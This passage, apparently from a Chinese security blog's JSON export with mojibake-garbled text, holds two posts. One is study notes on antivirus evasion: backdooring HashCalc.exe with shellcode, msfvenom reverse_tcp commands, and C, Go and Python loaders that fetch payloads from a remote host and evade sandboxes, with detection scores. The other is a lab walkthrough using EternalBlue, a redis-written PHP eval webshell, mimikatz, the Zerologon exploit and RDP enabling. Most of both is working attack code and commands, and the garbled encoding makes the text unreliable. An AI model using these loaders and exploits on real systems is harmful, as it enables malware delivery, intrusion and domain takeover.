path\u0026gt; Get-PESecurity -directory \u0026lt;directory path for DLLs \u0026amp; EXEs\u0026gt; é€‰æ‹©ç›®æ ‡å¯¹è±¡çš„æ ‡å‡†ï¼š\nå¤§å°\u0026lt;10mbï¼Œåˆ©äºä¼ è¾“ æœ¬èº«ä¸ºå¤§ä¼—æ–‡ä»¶ï¼Œä¾¿äºéšè”½ ä¸å—ASLRæˆ–DEPç­‰å®‰å…¨åŠŸèƒ½çš„ä¿æŠ¤ æœ€å¥½æœ¬èº«æœ‰ä½¿ç”¨ç½‘ç»œé€šä¿¡çš„åˆæ³•åŠŸèƒ½ è¿™é‡Œé€‰æ‹©çš„æ˜¯HashCalc.exe\né¦–å…ˆåœ¨åœ¨ä»£ç åŒºæ®µä¸­åˆ›å»ºæ–°çš„èŠ‚å¤´ï¼Œæˆ–åœ¨å†…å­˜ä¸­æ‰¾åˆ°åˆé€‚çš„ä½ç½®æ¤å…¥æˆ‘ä»¬çš„shellcode ç”¨Lord PEæ‰“å¼€ç›®æ ‡ç¨‹åºï¼Œå¹¶åœ¨åŒºæ®µè¡¨åº•éƒ¨æ·»åŠ æ–°æ®µ.ameï¼Œå¹¶å°†VSizeå’ŒRSizeéƒ½å¢åŠ 0x1000ï¼ˆ4096å­—èŠ‚ï¼‰ï¼Œå¹¶è®¾ç½®å¯è¯»å¯å†™å¯æ‰§è¡Œ\næ­¤æ—¶ç›´æ¥è¿è¡Œä¼šå¤±è´¥ï¼Œå› ä¸ºæˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ª1000hå­—èŠ‚çš„æ–°æ®µï¼Œä½†æ˜¯è¯¥åŒºæ®µä¸ºç©º\nå…ˆç®€å•å¡«å……1000ä¸ª0x00çœ‹ç¨‹åºæ˜¯å¦æ­£å¸¸è¿è¡Œï¼Œè¿™é‡Œç”¨çš„æ˜¯HxDï¼ˆæ³¨æ„è¦å¡«å……åˆ°æ–‡ä»¶æœ«å°¾ï¼‰\nå¯ä»¥æ­£å¸¸è¿è¡Œ\nåŠ«æŒç¨‹åºæ‰§è¡Œæµç¨‹ é¦–å…ˆåœ¨Ollydbgä¸­è½¬åˆ°å†…å­˜éƒ¨åˆ†ï¼ˆalt+Mï¼‰ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ–°åŠ çš„.ameï¼Œå¹¶ä¸”æœ‰RWEæƒé™\næ¥ä¸‹æ¥æˆ‘ä»¬è¦å°†ç¨‹åºçš„æ‰§è¡ŒæµåŠ«æŒåˆ°æˆ‘ä»¬æ–°æ·»åŠ çš„.ameæ®µä¸­ï¼Œä½¿æœ€ç»ˆæ‰§è¡Œç¨‹åºæ—¶è¿›å…¥æ”¾æœ‰shellcodeçš„.ameéƒ¨åˆ†\né¦–å…ˆå¤åˆ¶å‰3ä¸ªæ“ä½œç ï¼ˆä¹‹åå›å¤æ‰§è¡Œæµç¨‹æ—¶éœ€è¦ï¼‰\næˆ‘ä»¬å¤åˆ¶.ameçš„èµ·å§‹åœ°å€00482000ï¼Œå¹¶æŠŠç¨‹åºå…¥å£å¤„çš„push ebpæ”¹ä¸ºjmp 00482000å¹¶ä¿å­˜ä¸ºæ–°çš„exe\nå†æ¬¡è¿è¡Œæ—¶å°±å·²ç»ä¸ä¼šå±•ç¤ºæ­£å¸¸çš„é¡µé¢äº†\nå¡«å……msfğŸ è¿™é‡Œç”¨messageboxåšå¡«å……\nmsfvenom -p windows/messagebox text=\u0026#34;it\u0026#39;s demo\u0026#34; -f hex åœ¨jmp 00482000å¤„enterè·Ÿéšè·³è½¬ï¼ŒæŠŠpayloadå¤åˆ¶åˆ°nullçš„éƒ¨åˆ†ï¼Œä¿å­˜ä¸ºæ–°çš„exe\næˆåŠŸè¿è¡Œ\nå›å¤ç¨‹åºçš„æ­£å¸¸æ‰§è¡Œæµç¨‹ é¦–å…ˆå°†shellcodeæœ€åä¸€å¥è·³è½¬æ”¹ä¸ºnopï¼Œä½¿ç”¨popfdå’Œpopodå›å¤å †æ ˆæ“ä½œï¼Œç„¶åå°†åŸç¨‹åºèµ·å§‹ä½ç½®çš„æ±‡ç¼–ç å¤åˆ¶åˆ°è¿™é‡Œï¼Œæœ€åè·³è½¬å›åŸæ¥çš„æ‰§è¡Œåœ°å€\nå°±å¯ä»¥åœ¨å¼¹messageboxä¹‹åç»§ç»­HashCalcåŸç¨‹åºäº†\nåŒç†ï¼Œæˆ‘ä»¬å¯ä»¥æ’å…¥msfğŸ\nmsfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 4 -b \u0026#39;\\x00\u0026#39; lhost=192.168.31.29 lport=4788 -f hex æ³¨æ„æ­¤å¤„é€‰ç”¨x86/shikata_ga_naiçš„encoderä¹‹åå‰é¢å°±ä¸èƒ½ç”¨x64äº†ï¼Œé»˜è®¤ç”Ÿæˆçš„éƒ½æ˜¯x86çš„payloadï¼Œå¹¶ä¸”è¦æ³¨æ„-iå‚æ•°çš„æŒ‡å®šï¼Œè¦ä¸å‰é¢æ‰©å……çš„æ–°æ®µå¤§å°ç›¸åŒ¹é…\nshellcodeåŠ è½½å™¨ æ ¹æ®å‰é¢å¯¹ğŸç»“æ„çš„åˆ†æï¼Œæˆ‘ä»¬çŸ¥é“å•ä¸€çš„shellcodeæ˜¯æ— æ³•æ‰§è¡Œçš„ï¼Œéœ€è¦é…å¥—çš„shellcode loaderæ¥æ¥æ”¶åç»­çš„stagerï¼Œç¼–å†™çš„æ€è·¯éƒ½æ˜¯å¤§å·®ä¸å·®çš„ï¼Œä»¥åŠ¨æ€åŠ è½½å†…å­˜ä¸ºä¾‹ï¼š\næ¥æ”¶4å­—èŠ‚ç¼“å†²åŒºå¤§å° å¼€è¾Ÿå†…å­˜ å°†socketä¸­çš„å€¼å¤åˆ¶åˆ°ç¼“å†²åŒºä¸­å» è¯»å–å­—èŠ‚åˆ°ç¼“å†²åŒº æ‰§è¡Œsyscall é€€å‡º è¿™æ˜¯æœ€æœ€æœ€åŸºç¡€çš„loaderï¼Œå½“è€ƒè™‘åˆ°å…æ€æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨ä¸åŒçš„è¯­è¨€æ¥ç¼–è¯‘exeï¼ˆæ¯”å¦‚python, goç­‰ï¼‰ã€æ¶ˆé™¤ä»£ç ä¸­çš„æ˜æ˜¾ç‰¹å¾ï¼Œæˆ–æ˜¯ä¸ºæ¥æ”¶payloadè¿™ä¸€è¡Œä¸ºå‰åŠ ä¸Šæ²™ç›’ä¸­æ— æ³•å®ç°çš„æ¡ä»¶æ¥bypass\nä¸‹é¢ä»¥cçš„ç‰ˆæœ¬åšä¸»è¦çš„ç¤ºä¾‹ï¼šï¼‰\n# äº²æµ‹è¿™ä¸ªencoderå®Œå…¨ä¸èƒ½ç”¨åˆ°windows/x64/xxxä¸Š ä¹‹åç¼–è¯‘exeä¹Ÿå¾—ç”¨`gcc -m32 x.c -o x.exe` å¿…é¡»é…å¥—32ä½ # è¿™æ ·äº§ç”Ÿçš„shellcodeæœ¬ä½“å¯ä»¥åšåˆ°åŸºæœ¬å…æ€ åç»­çš„æ“ä½œåŸºäºå¦‚ä½•å…æ€åŠ è½½ msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 4 -b \u0026#39;\\x00\u0026#39; lhost=192.168.31.29 lport=4788 -f c -o t1 C ä¸è€ƒè™‘loaderçš„è£¸æ‰§è¡Œï¼ˆå¿…è¢«æ€ #include \u0026lt;windows.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; unsigned char buf[] = \u0026#34;\u0026#34;; void main(){ ((void(*)(void)) \u0026amp; buf)(); } ç”³è¯·åŠ¨æ€å†…å­˜åŠ è½½ é€šå¸¸ä¼šè°ƒç”¨kernel32çš„win apiï¼Œå¸¸è§å‡½æ•°å’Œå®ƒä»¬çš„ä½œç”¨ï¼ˆä»¥cä¸ºä¾‹ï¼‰\nmalloc: åˆ†é…å†…å­˜ VirtualAlloc: ç”³è¯·ä¸€å—å¯è¯»å¯å†™å¯æ‰§è¡Œçš„åŠ¨æ€å†…å­˜åŒºåŸŸ memcpy: ä»æŒ‡å®šå†…å­˜ä¸­å¤åˆ¶å†…å®¹è‡³å¦ä¸€å†…å­˜é‡Œ void main(){ LPVOID Memory; Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\t// å†…å­˜åœ°å€, å¤§å°, åˆ†é…ç±»å‹, è¯¥å†…å­˜çš„åˆå§‹ä¿æŠ¤å±æ€§ memcpy(Memory, buf, sizeof(buf)); ((void(*)())Memory)(); } å†…è”æ±‡ç¼–æŒ‡ä»¤ *æ³¨æ„gccçš„å†…è”æ±‡ç¼–ä¸vcçš„ä¸åŒ ä½¿ç”¨AT\u0026amp;Tè¯­æ³•ï¼Œè¯·å‚ç…§GCCå†…è”æ±‡ç¼–åŸºç¡€\nGo é€šè¿‡syscallå¯ä»¥ä¸æ»‘åœ°è°ƒç”¨kernel32.dllçš„å‡½æ•°\næ¡ä»¶è§¦å‘ é¦–å…ˆå¯¹shellcodeè¿›è¡Œç®€æ˜“æ··æ·†\n# https://github.com/pureqh/bypassAV/blob/main/go_shellcode_encode.py import base64 buf1 = b\u0026#34;shellcode\u0026#34; b64shellcode = base64.b64encode(buf1).decode() b64shellcode = b64shellcode.replace(\u0026#34;A\u0026#34;,\u0026#34;#\u0026#34;).replace(\u0026#34;H\u0026#34;,\u0026#34;!\u0026#34;).replace(\u0026#34;1\u0026#34;,\u0026#34;@\u0026#34;).replace(\u0026#34;T\u0026#34;,\u0026#34;)\u0026#34;) print(b64shellcode) è¿™é‡Œæ¡ä»¶è§¦å‘ï¼ŒæŒ‡çš„æ˜¯åœ¨æœ€åæŒ‡ä»¤æ‰§è¡Œå‰ å…ˆè®¿é—®ä¸€æ¬¡å±€åŸŸç½‘å†…å­˜åœ¨è€Œæ²™ç®±å†…ä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œè¾¾åˆ°bypassæ²™ç®±çš„æ•ˆæœ\n// https://github.com/pureqh/bypassAV/blob/main/main.go package main import ( \u0026#34;encoding/base64\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;net/url\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;syscall\u0026#34; \u0026#34;unsafe\u0026#34; ) var ( kernel32 = syscall.NewLazyDLL(\u0026#34;kernel32.dll\u0026#34;) VirtualAlloc = kernel32.NewProc(\u0026#34;VirtualAlloc\u0026#34;) RtlMoveMemory = kernel32.NewProc(\u0026#34;RtlMoveMemory\u0026#34;) ) func build(ddm string) { str1 := strings.Replace(ddm, \u0026#34;#\u0026#34;, \u0026#34;A\u0026#34;, -1) str2 := strings.Replace(str1, \u0026#34;!\u0026#34;, \u0026#34;H\u0026#34;, -1) str3 := strings.Replace(str2, \u0026#34;@\u0026#34;, \u0026#34;1\u0026#34;, -1) str4 := strings.Replace(str3, \u0026#34;)\u0026#34;, \u0026#34;T\u0026#34;, -1) sDec, _ := base64.StdEncoding.DecodeString(str4) addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sDec)), 0x1000|0x2000, 0x40) _, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(\u0026amp;sDec[0])), uintptr(len(sDec))) syscall.Syscall(addr, 0, 0, 0, 0) } func main() { u, _ := url.Parse(\u0026#34;http://192.168.31.29/pay\u0026#34;) q := u.Query() u.RawQuery = q.Encode() res, err := http.Get(u.String()) if err != nil { return } resCode := res.StatusCode res.Body.Close() if err != nil { return } var y int = 200 if resCode == y { build(\u0026#34;\u0026#34;)\t// b64 payload here } } go build -trimpath -ldflags=-H=windowsgui main.go æŸ¥æ€ç»“æœæ˜¯12/68ï¼Œå¯ä»¥å†å¯¹goè„šæœ¬è¿›è¡Œæ··æ·†å¤„ç†\nimport random #author: pureqh #github: https://github.com/pureqh/bypassAV #use: python build.py exp = \u0026#39;\u0026#39;\u0026#39;package main import ( \u0026#34;encoding/base64\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;syscall\u0026#34; \u0026#34;unsafe\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;net/url\u0026#34; ) var ( {2} = syscall.NewLazyDLL(\u0026#34;kernel32.dll\u0026#34;) {3} = {2}.NewProc(\u0026#34;VirtualAlloc\u0026#34;) {4} = {2}.NewProc(\u0026#34;RtlMoveMemory\u0026#34;) ) func {5}({6} string){0} {7} :=strings.Replace({6}, \u0026#34;#\u0026#34;, \u0026#34;A\u0026#34;, -1 ) {8} :=strings.Replace({7}, \u0026#34;!\u0026#34;, \u0026#34;H\u0026#34;, -1 ) {9} :=strings.Replace({8}, \u0026#34;@\u0026#34;, \u0026#34;1\u0026#34;, -1 ) {10} :=strings.Replace({9}, \u0026#34;)\u0026#34;, \u0026#34;T\u0026#34;, -1 ) {11},_ := base64.StdEncoding.DecodeString({10}) {12}, _, _ := {3}.Call(0, uintptr(len({11})), 0x1000|0x2000, 0x40) _, _, _ = {4}.Call({12}, (uintptr)(unsafe.Pointer(\u0026amp;{11}[0])), uintptr(len({11}))) syscall.Syscall({12}, 0, 0, 0, 0) {1} func main() {0} {14}, _ := url.Parse(\u0026#34;http://192.168.31.29/pay\u0026#34;) {15} := {14}.Query() {14}.RawQuery = {15}.Encode() {16}, {18} := http.Get({14}.String()) if {18} != nil {0} return {1} {13} := {16}.StatusCode {16}.Body.Close() if {18} != nil {0} return {1} var {17} int = 200 if {13} == {17} {0} {5}(\u0026#34;\u0026#34;) // b64 payload here {1} {1}\u0026#39;\u0026#39;\u0026#39; def random_name(len): str = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; return \u0026#39;\u0026#39;.join(random.sample(str,len)) def build_AV(): lef = \u0026#39;\u0026#39;\u0026#39;{\u0026#39;\u0026#39;\u0026#39; rig = \u0026#39;\u0026#39;\u0026#39;}\u0026#39;\u0026#39;\u0026#39; var1 = random_name(random.randint(3,9)) var2 = random_name(random.randint(3,9)) var3 = random_name(random.randint(3,9)) fun1 = random_name(random.randint(3,9)) var4 = random_name(random.randint(3,9)) var5 = random_name(random.randint(3,9)) var6 = random_name(random.randint(3,9)) var7 = random_name(random.randint(3,9)) var8 = random_name(random.randint(3,9)) var9 = random_name(random.randint(3,9)) var10 = random_name(random.randint(3,9)) var11 = random_name(random.randint(3,9)) var12 = random_name(random.randint(3,9)) var13 = random_name(random.randint(3,9)) var14 = random_name(random.randint(3,9)) var15 = random_name(random.randint(3,9)) var16 = random_name(random.randint(3,9)) shellc = exp.format(lef,rig,var1,var2,var3,fun1,var4,var5,var6,var7,var8,var9,var10,var11,var12,var13,var14,var15,var16) return shellc if __name__ == \u0026#39;__main__\u0026#39;: print(build_AV()) æŸ¥æ€ç»“æœ12/69ï¼Œå¯è¿‡ç«ç»’\nPython ä½¿ç”¨å†…ç½®çš„ctypesåº“å¯ä»¥ä¸æ»‘åœ°è°ƒç”¨kernel32.dllçš„å‡½æ•°ï¼Œå”¯ä¸€éœ€è¦æ³¨æ„çš„æ˜¯ç”±äº64ä½ä¸32ä½ç³»ç»Ÿçš„å·®å¼‚ï¼ˆä¼šå½±å“pythonå¯¹äºæŒ‡é’ˆçš„å¤„ç†ï¼‰ï¼Œéœ€è¦åœ¨æœ€å¼€å§‹è®¾ç½®VirtualAlloc.restype = ctypes.c_uint64\nctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 å¹¶ä¸”äº²æµ‹åœ¨64ä½ç³»ç»Ÿä¸Šæ— æ³•å¤„ç†msfç”Ÿæˆçš„32ä½shellcodeï¼Œæƒ¨æƒ¨\nimport ctypes ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 shellcode = b\u0026#34;\u0026#34; shellcode = bytearray(shellcode) ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40)) buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) ctypes.windll.kernel32.RtlMoveMemory( ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode)) ) # åˆ›å»ºä¸€ä¸ªæ–°çº¿ç¨‹ handle = ctypes.windll.kernel32.CreateThread( ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)) ) # ç­‰å¾…ä¸Šé¢åˆ›å»ºçš„çº¿ç¨‹è¿è¡Œç»“æŸ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1)) å¯¹shellcodeè¿›è¡Œb64å¤„ç† shellcode = base64.b64decode(_shellcode) shellcode = bytearray(shellcode) hexå¤„ç† shellcode = bytearray(_shellcode.decode(\u0026#34;hex\u0026#34;)) è¿œç¨‹wget æ³¨æ„å°½é‡é¿å…å‡ºç°ç‰¹æ®Šå­—ç¬¦ï¼Œå¦‚æœæœ‰ äºŒæ¬¡å¤„ç†\nimport urllib.request, base64, codeces shellcode = urllib.request.urlopen(\u0026#39;http://192.168.1.1:8000/test.txt\u0026#39;).read()\t# b64æ ¼å¼çš„payload shellcode = base64.b64decode(shellcode) shellcode = codecs.escape_decode(shellcode)[0] shellcode = bytearray(shellcode) pickleååºåˆ—åŒ– ctfå­¦åˆ°çš„æŠ€å·§ä¸èƒ½ä¸¢ï¼Œæ¯”å•çº¯çš„hex, xor, b64ç¨å¾®å¼ºä¸€ç‚¹ç‚¹ï¼Œå¯ä»¥é…åˆä¸Šé¢çš„è¿œç¨‹wgetæ–¹å¼ç»•è¿‡\nimport pickle, urllib.requests, base64, codeces # ç”Ÿæˆ shellcode = \u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\t# ä¸Šé¢åŸºç¡€æ¬¾çš„å…¨éƒ¨ä»£ç  class A(object): def __reduce__(self): return(exec, (shellcode,)) ret = pickle.dumps(A()) ret_base64 = base64.b64encode(ret) print(ret_base64) # åŠ è½½ pickle.loads(base64.b64decode(ret_base64)) æ‰“åŒ…exe ç”Ÿæˆpickle payload\nimport ctypes, urllib.request, base64, codecs, pickle shellcode = \u0026#39;\u0026#39;\u0026#39;ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 _shellcode = urllib.request.urlopen(\u0026#39;http://192.168.31.29/pay1\u0026#39;).read() _shellcode = base64.b64decode(_shellcode) _shellcode = base64.b64decode(_shellcode) _shellcode = base64.b64decode(_shellcode) _shellcode = codecs.escape_decode(_shellcode)[0] _shellcode = bytearray(_shellcode) ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(_shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40)) buf = (ctypes.c_char * len(_shellcode)).from_buffer(_shellcode) ctypes.windll.kernel32.RtlMoveMemory( ctypes.c_uint64(ptr), buf, ctypes.c_int(len(_shellcode)) ) handle = ctypes.windll.kernel32.CreateThread( ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)) ) ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))\u0026#39;\u0026#39;\u0026#39; class A(object): def __reduce__(self): return(exec, (shellcode,)) ret = pickle.dumps(A()) ret_base64 = base64.b64encode(ret) print(ret_base64) è¢«pyinstalleræˆ–py2exeæ‰“åŒ…çš„éƒ¨åˆ† pack1.py\nimport ctypes,urllib.request,codecs,base64,pickle ret_base64 = b\u0026#34;\u0026#34; pickle.loads(base64.b64decode(ret_base64)) PyInstaller æ‰“åŒ…çš„æ›´å¤šå‚æ•°å‚è§doc: Using PyInstallerï¼Œç”Ÿæˆexeåœ¨distæ–‡ä»¶å¤¹ä¸­\npip3 install pyinstaller pyinstaller --noconsole --onefile pack1.py -n demo1 # --noconsole æ— é»‘æ¡† # --onefile å•ä¸€æ–‡ä»¶ # -i æŒ‡å®šfavicon # -n ç”Ÿæˆexeåå­— å°±ä»¥è¿™æ ·æœ€ç®€å•çš„æ–¹å¼åˆ¶ä½œçš„åŠ è½½å™¨çš„æŸ¥æ€æƒ…å†µæ˜¯22/66ï¼Œå¯ä»¥ç›´æ¥è¿‡ç«ç»’\npy2exeï¼ˆ*äº²æµ‹ ç”Ÿæˆçš„exeæ–‡ä»¶å¤§å°å°äºPyInstaller ä½†ä¸€å®šæ¦‚ç‡æ— æ³•æ‰§è¡Œ ï¼‰ ä¸­é—´åª’ä»‹pack2.py\nfrom distutils.core import setup import py2exe setup( options={ \u0026#39;py2exe\u0026#39;: { \u0026#39;optimize\u0026#39;: 2, # ä¼˜åŒ–çº§åˆ«æœ€é«˜ï¼Œ \u0026#39;bundle_files\u0026#39;: 1, # å°†ç”Ÿæˆçš„è°ƒç”¨æ–‡ä»¶æ‰“åŒ…è¿›exeæ–‡ä»¶ \u0026#39;compressed\u0026#39;: 1, # å‹ç¼© }, }, windows=[{\u0026#34;script\u0026#34;: \u0026#34;pack1.py\u0026#34;}], #éœ€è¦æ‰“åŒ…çš„ç¨‹åºçš„æ–‡ä»¶è·¯å¾„ï¼Œwindows-\u0026gt;GUI exeçš„è„šæœ¬åˆ—è¡¨,console-\u0026gt; æ§åˆ¶å°exeçš„è„šæœ¬åˆ—è¡¨ zipfile=None, # ä¸ç”Ÿæˆlibrary.zipæ–‡ä»¶ï¼Œåˆ™æ†ç»‘åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­ ) pip3 install py2exe python pack2.py py2exe æŸ¥æ€æƒ…å†µ14/69ï¼Œå¯è¿‡ç«ç»’\nä¸€å¼€å§‹å°±æ˜¯åšé¶åœºçš„æ—¶å€™ä¸€æ—¶å…´èµ·çœ‹çœ‹å…æ€ï¼Œåæ¥å‘ç°é‡Œé¢é—¨é“è¿˜æŒºå¤šçš„ï¼ˆæˆ‘æ˜¯åœŸç‹—ï¼‰ï¼Œä¼°è®¡ä»¥åæœ‰ç©ºè¿˜ä¼šè®¤çœŸå­¦\nä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ğŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ Undetectable backdooring PE file | æ‰‹å·¥shellcodeæ³¨å…¥\næ¶æ„ç¨‹åºç¼–å†™ä¹‹å…æ€åŸºç¡€ | å…æ€å­¦ä¹ \u0026ndash;shellcodeåŠ è½½å…æ€\nå‡ ç§åŠ è½½shellcodeçš„æ–¹æ³•\ngo-shellcode | GolangBypassAV | bypassAV\nPython ShellcodeåŠ è½½å™¨ç»•è¿‡AV\n","date":"2022-04-26T23:42:54+08:00","permalink":"https://amiaaaz.github.io/2022/04/26/bypass-av-study-notes-01/","section":"posts","tags":["å…æ€"],"title":"å…æ€å­¦ä¹ ç¬”è®°â… "},{"categories":["PENTEST"],"contents":" æœ¬æœº 192.168.110.131\né¶æœºwin7 192.168.110.129; 10.0.20.98\nåŸŸç”¨æˆ·win2016 10.0.20.98; 10.0.10.111\nåŸŸæ§win2019 10.0.10.110\nè®¿é—®192.168.110.129çš„80webé¡µé¢ï¼Œæ˜¯é€šè¾¾OA\n/inc/expired.phpé¡µé¢è·å¾—ç‰ˆæœ¬ä¿¡æ¯\nnmapæ‰«ä¸€ä¸‹ï¼Œå¼€äº†445çš„win7ï¼Œè¯•ä¸€ä¸‹æ°¸æ’ä¹‹è“\nuse auxiliary/scanner/smb/smb_ms17_010 use exploit/windows/smb/ms17_010_eternalblue å¾—åˆ°shellï¼Œçœ‹ä¸‹ç½‘ç»œä¿¡æ¯\næœ‰ä¸€ä¸ªå†…ç½‘ip 10.0.20.98\nmsfçš„ä¸ç¨³å®šï¼Œåšè¿›ç¨‹è¿ç§»ï¼›ä¸Šä¼ npcåšsocks5ä»£ç†\nmeterpreter \u0026gt; run post/windows/manage/migrate meterpreter \u0026gt; upload /home/kali/t00ls/nps_client_win/npc.exe C:\\\\Users npc.exe install -server=xxx -vkey=xxx npc.exe start vim /etc/proxychains4.conf # proxy dns socks5 ip port å¦å¤–ä¼ ä¸€ä¸ªcsçš„ğŸå¹¶ä¸Šçº¿\nmeterpreter \u0026gt; upload /home/kali/t3mp/cs1.exe C:\\\\Users beacon \u0026gt; sleep 5 æŒ‚ä»£ç†åæ‰«æå†…ç½‘cæ®µ\nproxychains4 nmap -Pn 10.0.20.98/24 å‘ç°10.0.20.99æœ‰redisï¼Œå°è¯•redisæœªæˆæƒå†™shellï¼ˆå®é™…è¿™é‡Œæ‰«å´©äº†ï¼Œç›´æ¥æ‰“çš„\næ›´è›‹ç–¼çš„æ˜¯kaliå®‰è£…ä¸äº†redis-cliï¼Œå„ç§æ¢æºéƒ½æ— è§£ï¼Œåªèƒ½æŠŠåŸæ¥åªä»£ç»™å±€åŸŸç½‘çš„å†ä»£ç»™å…¬ç½‘ï¼Œè¿å‡ºæ¥æ‰“\né¦–å…ˆç”Ÿæˆä¸ªmsfğŸè¿ç»™æˆ‘è‡ªå·±çš„kaliè™šæ‹Ÿæœºï¼Œè¿™é‡Œçš„å‘ç‚¹ï¼šä¸¤å¤„çš„payloadè¦ä¸¥æ ¼ä¸€è‡´ï¼ˆåˆ«å¤šä¸€ä¸ªæˆ–å°‘ä¸€ä¸ªx64ï¼Œå¦å¤–lhostè®¾ä¸º0.0.0.0æ‰å¯ä»¥è¢«ä»£å‡ºå»\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=vps_ip LPORT=port -f exe \u0026gt; msfr.exe msf \u0026gt; use exploit/multi/handler msf \u0026gt; set payload windows/meterpreter/reverse_tcp msf \u0026gt; set lhost 0.0.0.0 msf \u0026gt; set lport 2308 msf \u0026gt; run ç„¶ååœ¨å¾—åˆ°çš„shellé‡ŒæŠŠä¹‹å‰æ³¨å†Œå¥½çš„npcå–æ¶ˆæ³¨å†Œåé‡æ–°æ³¨å†Œä¸ºå…¬ç½‘çš„\nnpc.exe stop npc.exe uninstall npc.exe install -server=xxx -vkey=xxx npc.exe start å’Œä¹‹å‰ä¸€æ ·ï¼Œæ”¹proxychainsçš„é…ç½®æ–‡ä»¶ï¼ˆä¸å¤åˆ¶äº†ï¼‰ï¼Œwindowsç”¨proxifierï¼ˆä¹Ÿå¾ˆç®€å•ï¼‰\n2308 meterpreter\n2309 socks5 win7 win7123\nproxychains4 redis-cli -h 10.0.20.99 \u0026gt; config set dir \u0026#34;C:/phpStudy/PHPTutorial/WWW/\u0026#34; \u0026gt; config set dbfilename tx.php \u0026gt; set 1 \u0026#34;\u0026lt;?php @eval($_POST[\u0026#39;ame\u0026#39;]);?\u0026gt;\u0026#34; \u0026gt; save è¿èšå‰‘ï¼Œcsä¸Šç”¨ä»£ç†è½¬å‘ä¸Šçº¿ via 10.0.20.98ï¼Œæ‰€ä»¥éœ€è¦å†å‰é¢æŠŠå…¬ç½‘çš„ä»£ç†æ¢å›å»ï¼Œå†uninstall install ä¸€æ¬¡\næ³¨æ„å®æµ‹pivoting-\u0026gt;Listenerè¿™æ ·ç”Ÿæˆçš„åå‘é©¬å¹¶ä¸èƒ½å¼¹å›æ¥ï¼ŒåŸå› æœªçŸ¥ï¼›è§£å†³åŠæ³•æ˜¯ç”ŸæˆListenerä¸ºbeacon TCPçš„æ­£å‘é©¬ï¼Œå†åœ¨ä¹‹å‰çš„beaconä¸­connect 10.0.20.99ï¼Œå³å¯ä¸Šçº¿\nmimikatzæŠ“å¯†ç ï¼Œå¾—åˆ°éæ˜æ–‡hash\nä¸Šä¼ msfæ­£å‘ğŸå¹¶è¿æ¥\nmsfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6698 -f exe \u0026gt; msfr2.exe msf \u0026gt; set proxies socks5:192.168.110.131:8879 msf \u0026gt; use exploit/multi/handler msf \u0026gt; set payload windows/x64/meterpreter/bind_tcp msf \u0026gt; set lport 6698 msf \u0026gt; set rhost 10.0.20.99 msf \u0026gt; exploit meterpreter \u0026gt; run post/windows/manage/migrate ä½†è¿™é‡Œå¾—åˆ°çš„sessionéå¸¸å®¹æ˜“æ–­ï¼ŒåŠ¨ä¸åŠ¨å°±reason: diedï¼Œåªèƒ½æ‰‹åŠ¨æŠŠé©¬å’Œexploitå¤šç”¨å‡ æ¬¡\nå®šä½åŸŸæ§\nrun post/windows/gather/enum_domain å¾—åˆ°åŸŸå’ŒåŸŸæ§ä¿¡æ¯\næ·»åŠ ä¸»æœºå¯¹10.0.10.*çš„è·¯ç”±\nmsf \u0026gt; bg msf \u0026gt; sessions x meterpreter \u0026gt; run post/multi/mamage/autoroute nmapç®€å•æ‰«ä¸€ä¸‹\nproxychains4 nmap -sS -Pn 10.0.10.110 ç”¨cve-2020-1472åŸŸå†…ææƒ\nproxychains4 python3 cve-2020-1472-exploit.py win2019 10.0.10.110 proxychains4 python3 secretsdump.py vulntarget.com/win2019\\$@10.0.10.110 -no-pass\t# å¾—åˆ°administratorçš„hash proxychains4 python3 smbexec.py -hashes \u0026lt;hash\u0026gt; administrator@10.0.10.110 å¼€å¯è¿œç¨‹æ¡Œé¢\nreg add \u0026#34;HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\u0026#34; /t REG_DWORD /v portnumber /d 3389 /f wmic RDTOGGLE WHERE ServerName=\u0026#39;%COMPUTERNAME%\u0026#39; call SetAllowTSConnections 1 netsh advfirewall firewall add rule name=\u0026#34;Remote Desktop\u0026#34; protocol=TCP dir=in localport=3389 